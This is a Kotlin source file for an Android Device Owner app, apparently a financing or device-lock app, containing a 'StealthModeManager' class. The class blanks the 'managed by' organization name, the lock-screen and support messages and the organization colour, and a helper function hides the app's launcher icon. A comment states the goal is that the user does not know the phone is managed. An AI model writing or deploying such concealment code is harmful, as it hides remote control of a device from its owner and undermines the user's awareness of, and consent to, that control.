package com.microspace.payo.security.mode

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import com.microspace.payo.receivers.admin.AdminReceiver

/**
 * STEALTH MODE MANAGER
 *
 * Removes/hides "This device is managed" messages from lock screen and settings.
 * Makes Device Owner invisible to users.
 *
 * Swahili: Kuondoa ujumbe wa "simu hii inasimamiwa" ili mtumiaji asijue
 */
class StealthModeManager(private val context: Context) {

    private val dpm: DevicePolicyManager by lazy {
        context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    }

    private val adminComponent: ComponentName by lazy {
        ComponentName(context, com.microspace.payo.receivers.admin.AdminReceiver::class.java)
    }

    companion object {
        private const val TAG = "StealthMode"
    }

    /**
     * MAIN METHOD: Apply ALL stealth mode settings
     * Hides all "managed" messages from user
     */
    fun enableStealthMode() {
        Log.d(TAG, "Enabling Stealth Mode - Hiding management messages...")

        try {
            removeOrganizationName()
            removeLockScreenInfo()
            hideDeviceAdminInSettings()
            setNeutralOrganizationColor()
            removeSupportMessage()

            Log.d(TAG, "Stealth mode enabled - Device Owner is now hidden")
        } catch (e: Exception) {
            Log.e(TAG, "Error enabling stealth mode: ${e.message}", e)
        }
    }

    /**
     * CRITICAL: Remove organization name
     * Removes "Managed by [Organization]" from lock screen
     */
    fun removeOrganizationName() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                dpm.setOrganizationName(adminComponent, null)
                Log.d(TAG, "Organization name removed")
            } else {
                Log.w(TAG, "Organization name API not available on this Android version")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove organization name: ${e.message}", e)
        }
    }

    /**
     * Remove device owner lock screen message
     */
    fun removeLockScreenInfo() {
        try {
            dpm.setDeviceOwnerLockScreenInfo(adminComponent, null)
            Log.d(TAG, "Lock screen info removed")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove lock screen info: ${e.message}", e)
        }
    }

    /**
     * Device Owner apps are automatically hidden from Device Administrators list.
     * This verifies the status.
     */
    fun hideDeviceAdminInSettings() {
        try {
            val isDeviceOwner = dpm.isDeviceOwnerApp(context.packageName)
            if (isDeviceOwner) {
                Log.d(TAG, "Device Owner is hidden from Settings (automatic)")
            } else {
                Log.w(TAG, "Not a Device Owner - will be visible in Settings")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking device owner status: ${e.message}", e)
        }
    }

    /**
     * Set organization color to transparent/neutral
     */
    fun setNeutralOrganizationColor() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                dpm.setOrganizationColor(adminComponent, android.graphics.Color.TRANSPARENT)
                Log.d(TAG, "Organization color set to neutral")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to set organization color: ${e.message}", e)
        }
    }

    /**
     * Remove support messages
     */
    fun removeSupportMessage() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                dpm.setShortSupportMessage(adminComponent, null)
                dpm.setLongSupportMessage(adminComponent, null)
                Log.d(TAG, "Support messages removed")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove support message: ${e.message}", e)
        }
    }

    /**
     * Check if stealth mode is active
     */
    fun isStealthModeActive(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val orgName = dpm.getOrganizationName(adminComponent)
                orgName == null || orgName.toString().isEmpty()
            } else {
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking stealth mode: ${e.message}", e)
            false
        }
    }

    /**
     * Print stealth mode status for debugging
     */
    fun printStealthStatus() {
        try {
            Log.d(TAG, "========== STEALTH MODE STATUS ==========")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val orgName = dpm.getOrganizationName(adminComponent)
                Log.d(TAG, "Organization Name: ${orgName ?: "HIDDEN"}")
            }
            val isDeviceOwner = dpm.isDeviceOwnerApp(context.packageName)
            Log.d(TAG, "Device Owner (auto-hidden): ${if (isDeviceOwner) "YES" else "NO"}")
            Log.d(TAG, "========================================")
        } catch (e: Exception) {
            Log.e(TAG, "Error printing stealth status: ${e.message}", e)
        }
    }
}

/**
 * Hide app icon from launcher (optional, for complete invisibility)
 */
fun hideAppIconFromLauncher(context: Context, launcherActivityClass: Class<*>? = null) {
    val activityClass = launcherActivityClass ?: try {
        Class.forName("com.microspace.payo.ui.activities.main.MainActivity")
    } catch (e: Exception) {
        Log.e("StealthMode", "Could not find MainActivity: ${e.message}")
        return
    }
    try {
        val packageManager = context.packageManager
        val componentName = ComponentName(context, activityClass)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d("StealthMode", "App icon hidden from launcher")
    } catch (e: Exception) {
        Log.e("StealthMode", "Failed to hide app icon: ${e.message}", e)
    }
}

/**
 * Show app icon in launcher (for testing)
 */
fun showAppIconInLauncher(context: Context, launcherActivityClass: Class<*>? = null) {
    val activityClass = launcherActivityClass ?: try {
        Class.forName("com.microspace.payo.ui.activities.main.MainActivity")
    } catch (e: Exception) {
        Log.e("StealthMode", "Could not find MainActivity: ${e.message}")
        return
    }
    
    try {
        val packageManager = context.packageManager
        val componentName = ComponentName(context, activityClass)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d("StealthMode", "App icon shown in launcher")
    } catch (e: Exception) {
        Log.e("StealthMode", "Failed to show app icon: ${e.message}", e)
    }
}




